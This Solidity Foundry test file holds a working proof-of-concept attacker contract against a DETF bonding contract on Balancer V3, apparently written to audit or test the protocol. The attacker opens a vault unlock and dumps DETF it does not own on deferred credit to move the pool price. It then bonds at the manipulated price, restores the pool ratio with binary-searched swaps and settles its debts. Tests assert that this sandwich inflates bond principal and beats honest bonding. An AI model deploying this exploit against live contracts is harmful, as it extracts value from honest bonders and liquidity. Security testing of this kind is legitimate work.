// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IVault} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IVault.sol";
import {SwapKind, VaultSwapParams} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/VaultTypes.sol";
import {IDetfBondNFT} from "contracts/interfaces/IDetfBondNFT.sol";
import {
    TestBase_SingleStandardExchangeDETF
} from "contracts/vaults/detf/protocols/dexes/balancer/v3/standardExchange/single/TestBase_SingleStandardExchangeDETF.sol";
import {ISingleStandardExchangeDETFBonding} from
    "contracts/vaults/detf/protocols/dexes/balancer/v3/standardExchange/single/ISingleStandardExchangeDETFBonding.sol";
import {ISingleStandardExchangeDETFInfo} from
    "contracts/vaults/detf/protocols/dexes/balancer/v3/standardExchange/single/ISingleStandardExchangeDETFInfo.sol";

/// @notice Unprivileged attacker: opens its own Balancer V3 unlock, dumps DETF into the reserve pool on
///         deferred credit (no DETF inventory), bonds, then restores the pool ratio and settles all deltas.
interface IWPool { function getNormalizedWeights() external view returns (uint256[] memory); }

contract BalUnlockBondAttacker {
    IVault public immutable vault;
    address public immutable detf;
    address public immutable pool;
    IERC20 public immutable share;

    uint256 public dumpAmt;
    uint256 public bondAmt;
    uint256 public duration;
    uint256 public bondId;
    bool public sawUnlocked;

    constructor(IVault v_, address detf_, address pool_, IERC20 share_) {
        vault = v_; detf = detf_; pool = pool_; share = share_;
    }

    function _idx() internal view returns (uint256 di, uint256 si) {
        (IERC20[] memory t,,,) = vault.getPoolTokenInfo(pool);
        di = address(t[0]) == detf ? 0 : 1;
        si = 1 - di;
    }

    function raw() public view returns (uint256 d, uint256 s) {
        (,, uint256[] memory r,) = vault.getPoolTokenInfo(pool);
        (uint256 di, uint256 si) = _idx();
        return (r[di], r[si]);
    }

    function attack(uint256 dump_, uint256 bond_, uint256 duration_) external returns (uint256) {
        dumpAmt = dump_; bondAmt = bond_; duration = duration_;
        vault.unlock(abi.encodeCall(this.cb, ()));
        return bondId;
    }

    function _swap(SwapKind k, IERC20 i, IERC20 o, uint256 amt, uint256 lim) internal returns (uint256 inA, uint256 outA) {
        (, inA, outA) = vault.swap(VaultSwapParams({kind: k, pool: pool, tokenIn: i, tokenOut: o,
            amountGivenRaw: amt, limitRaw: lim, userData: ""}));
    }

    /// @dev Revert-to-quote probe: ratio after buying back DETF with `inS` shares.
    function probe(uint256 inS) external {
        require(msg.sender == address(this));
        _swap(SwapKind.EXACT_IN, share, IERC20(detf), inS, 0);
        (uint256 d, uint256 s) = raw();
        bytes memory r = abi.encode(d, s);
        assembly { revert(add(r, 32), mload(r)) }
    }

    function _probe(uint256 inS) internal returns (uint256 d, uint256 s) {
        try this.probe(inS) {} catch (bytes memory r) { if (r.length == 64) (d, s) = abi.decode(r, (uint256, uint256)); }
    }

    uint256 internal d0s; uint256 internal s0s; uint256 internal shareOutS; uint256 internal hiS;

    uint256 internal detfBackS;

    function _cheap(uint256 d, uint256 s) internal view returns (bool) { return d * s0s > d0s * s; }

    /// @dev Restore d/s to the pre-attack ratio with as many <=29% chunks as Balancer's MaxInRatio needs.
    function _restore() internal {
        for (uint256 k; k < 12; ++k) {
            (, uint256 sNow) = raw();
            uint256 cap = sNow * 29 / 100;
            (uint256 dc, uint256 sc) = _probe(cap);
            if (dc != 0 && _cheap(dc, sc)) {
                (, uint256 o) = _swap(SwapKind.EXACT_IN, share, IERC20(detf), cap, 0);
                hiS += cap; detfBackS += o;
                continue;
            }
            uint256 lo = 0; uint256 hi = cap;
            for (uint256 i; i < 200 && hi - lo > 1; ++i) {
                uint256 mid = (lo + hi) / 2;
                (uint256 d, uint256 s2) = _probe(mid);
                if (d != 0 && _cheap(d, s2)) lo = mid; else hi = mid;
            }
            (, uint256 o2) = _swap(SwapKind.EXACT_IN, share, IERC20(detf), hi, 0);
            hiS += hi; detfBackS += o2;
            break;
        }
        (uint256 df, uint256 sf) = raw();
        console2.log("restored d/s", df, sf);
    }

    function _settleDetf(uint256 detfBack) internal {
        if (detfBack >= dumpAmt) {
            vault.sendTo(IERC20(detf), address(this), detfBack - dumpAmt);
        } else {
            uint256 owe = dumpAmt - detfBack;
            IERC20(detf).transfer(address(vault), owe);
            vault.settle(IERC20(detf), owe);
        }
    }

    function _settleShare() internal {
        if (shareOutS >= hiS) {
            vault.sendTo(share, address(this), shareOutS - hiS);
        } else {
            uint256 owe2 = hiS - shareOutS;
            share.transfer(address(vault), owe2);
            vault.settle(share, owe2);
        }
    }

    function cb() external returns (bytes memory) {
        require(msg.sender == address(vault));
        sawUnlocked = vault.isUnlocked();
        (d0s, s0s) = raw();
        // 1. dump DETF the attacker does not own: deferred DETF debt, share credit.
        (, shareOutS) = _swap(SwapKind.EXACT_IN, IERC20(detf), share, dumpAmt, 0);
        console2.log("dump", dumpAmt, "shareOut", shareOutS);
        { (uint256 dd, uint256 ss) = raw(); console2.log("after dump d/s", dd, ss); }
        // 2. bond with own shares at the manipulated spot.
        share.approve(detf, bondAmt);
        (bondId,) = ISingleStandardExchangeDETFBonding(detf).bond(share, bondAmt, duration, address(this), false, block.timestamp + 1);
        { (uint256 dd, uint256 ss) = raw(); console2.log("after bond d/s", dd, ss); }
        // 3. restore ratio d/s == d0/s0
        _restore();
        // 4. settle all deltas
        _settleDetf(detfBackS);
        _settleShare();
        return "";
    }

    function honestBond(uint256 bond_, uint256 duration_) external returns (uint256 id) {
        share.approve(detf, bond_);
        (id,) = ISingleStandardExchangeDETFBonding(detf).bond(share, bond_, duration_, address(this), false, block.timestamp + 1);
        bondId = id;
    }

    function claim(IDetfBondNFT nft, uint256 id) external returns (uint256 p, uint256 r) {
        return nft.claimBond(id, address(this));
    }

    // sell all DETF for shares via own unlock (realization)
    uint256 internal sellAmt;
    function sellAll() external {
        sellAmt = IERC20(detf).balanceOf(address(this));
        if (sellAmt == 0) return;
        vault.unlock(abi.encodeCall(this.sellCb, ()));
    }
    function sellCb() external returns (bytes memory) {
        require(msg.sender == address(vault));
        (, uint256 out) = _swap(SwapKind.EXACT_IN, IERC20(detf), share, sellAmt, 0);
        IERC20(detf).transfer(address(vault), sellAmt);
        vault.settle(IERC20(detf), sellAmt);
        vault.sendTo(share, address(this), out);
        return "";
    }
}

contract BalDetfBondUnlock_SingleSE is TestBase_SingleStandardExchangeDETF {
    BalUnlockBondAttacker internal atk;
    address internal rpool;
    IDetfBondNFT internal nft;
    address internal attackerEOA = address(0xA77AC4);
    uint256 internal constant BOND = 30e18;

    function setUp() public virtual override {
        super.setUp();
        // honest bootstrap + an honest second bonder (victims)
        _bootstrapViaFirstBond(alice, 1_000e18);
        uint256 s_ = _fundSeShares(bob, 100e18);
        vm.startPrank(bob);
        seShare.approve(detf, s_);
        detfBonding.bond(seShare, s_, DEFAULT_MAX_LOCK, bob, false, block.timestamp + 1 hours);
        vm.stopPrank();
        rpool = ISingleStandardExchangeDETFInfo(detf).reservePool();
        nft = IDetfBondNFT(ISingleStandardExchangeDETFInfo(detf).bondNftVault());
        atk = new BalUnlockBondAttacker(IVault(address(vault)), detf, rpool, seShare);
        // attacker capital: honest SE deposit, counted as cost
        uint256 got_ = _fundSeShares(address(this), 120e18);
        seShare.transfer(address(atk), got_);
    }

    function _shareVal(uint256 detfAmt) internal view returns (uint256) {
        (uint256 d, uint256 s) = atk.raw();
        (IERC20[] memory t,,,) = IVault(address(vault)).getPoolTokenInfo(rpool);
        uint256[] memory w = IWPool(rpool).getNormalizedWeights();
        (uint256 wd, uint256 ws) = address(t[0]) == detf ? (w[0], w[1]) : (w[1], w[0]);
        // weighted spot (share per DETF raw unit) = (s/ws)/(d/wd); seShare rate provider ignored (constant within test)
        return detfAmt * s * wd / (d * ws);
    }

    uint256 internal sh0;

    function _logState(bool sandwich, uint256 id) internal view returns (uint256 principal) {
        (uint256 d1, uint256 s1) = atk.raw();
        principal = nft.positionOf(id).principal;
        console2.log(sandwich ? "== SANDWICH ==" : "== HONEST ==");
        console2.log("  vault unlocked during bond:", atk.sawUnlocked());
        console2.log("  pool d/s after ", d1, s1);
        console2.log("  principal DETF", principal);
        console2.log("  attacker loose DETF", IERC20(detf).balanceOf(address(atk)));
        int256 shareDelta = int256(seShare.balanceOf(address(atk))) - int256(sh0);
        console2.log("  attacker share delta (signed):");
        console2.logInt(shareDelta);
        uint256 v = _shareVal(principal + IERC20(detf).balanceOf(address(atk)));
        console2.log("  spot share value of principal+loose", v);
        console2.log("  spot PnL (signed):");
        console2.logInt(int256(v) + shareDelta);
    }

    function _run(uint256 dumpPct, bool sandwich) internal returns (int256 realized, uint256 principal) {
        (uint256 d0, uint256 s0) = atk.raw();
        console2.log("  pool d/s before", d0, s0);
        sh0 = seShare.balanceOf(address(atk));
        console2.log("  DETF supply before", IERC20(detf).totalSupply());
        vm.startPrank(attackerEOA, attackerEOA);
        uint256 id = sandwich ? atk.attack(d0 * dumpPct / 100, BOND, DEFAULT_MAX_LOCK) : atk.honestBond(BOND, DEFAULT_MAX_LOCK);
        vm.stopPrank();
        console2.log("  DETF supply after", IERC20(detf).totalSupply());
        principal = _logState(sandwich, id);
        _warpPastUnlock(detf, id);
        vm.startPrank(attackerEOA, attackerEOA);
        atk.claim(nft, id);
        atk.sellAll();
        vm.stopPrank();
        realized = int256(seShare.balanceOf(address(atk))) - int256(sh0);
        console2.log("  REALIZED share PnL after lock + dump (signed):");
        console2.logInt(realized);
        console2.log("  synthetic price after", ISingleStandardExchangeDETFInfo(detf).syntheticPrice());
    }

    function test_honest() public { _run(0, false); }

    function test_sandOnly() public { _run(25, true); }

    function test_sandwich25() public {
        uint256 snap = vm.snapshotState();
        (int256 rh, uint256 ph) = _run(0, false);
        vm.revertToState(snap);
        (int256 rs, uint256 ps) = _run(25, true);
        console2.log("principal honest / sandwich", ph, ps);
        console2.logInt(rh); console2.logInt(rs);
        assertTrue(atk.sawUnlocked());
        assertGt(ps, ph, "principal inflated");
        assertGt(rs, rh, "sandwich beats honest");
    }

    function test_sandwich10() public {
        uint256 snap = vm.snapshotState();
        (int256 rh, uint256 ph) = _run(0, false);
        vm.revertToState(snap);
        (int256 rs, uint256 ps) = _run(10, true);
        console2.log("principal honest / sandwich", ph, ps);
        console2.logInt(rh); console2.logInt(rs);
    }
}
